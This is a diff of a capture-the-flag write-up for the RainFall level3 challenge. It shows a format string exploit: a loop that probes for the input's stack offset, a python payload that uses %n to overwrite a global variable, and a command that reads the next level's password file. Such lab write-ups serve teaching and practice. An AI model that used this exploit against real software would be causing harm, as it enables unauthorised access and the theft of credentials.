@@ -1,9 +1,3 @@
-Infos:
-info variable => m (0x0804988c) (global variables)
-info function
-objdump -s level3
-x/s for printing strings
-
 We use the string formatting as security breach
 1- find the address of our input
 for((i=0;i<200;i++));do echo "Index $i" && echo "AAAA%$i\$x" | ./level3 ; done | grep -B1 41414141
@@ -45,8 +39,8 @@ Dump of assembler code for function v:
 End of assembler dump.
 
 3- we have use the formater %n of printf because it writes the number of characters to be printed, so we have to put 64 characters
-python -c "print('\x8c\x98\x04\x08' + 60 * 'A' + '%4\$n')" > /tmp/test
-level3@RainFall:~$ cat /tmp/test - | ./level3
+python -c "print('\x8c\x98\x04\x08' + 60 * 'A' + '%4\$n')" > /tmp/payload
+level3@RainFall:~$ cat /tmp/payload - | ./level3
 �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Wait what?!
 cat /home/user/level4/.pass
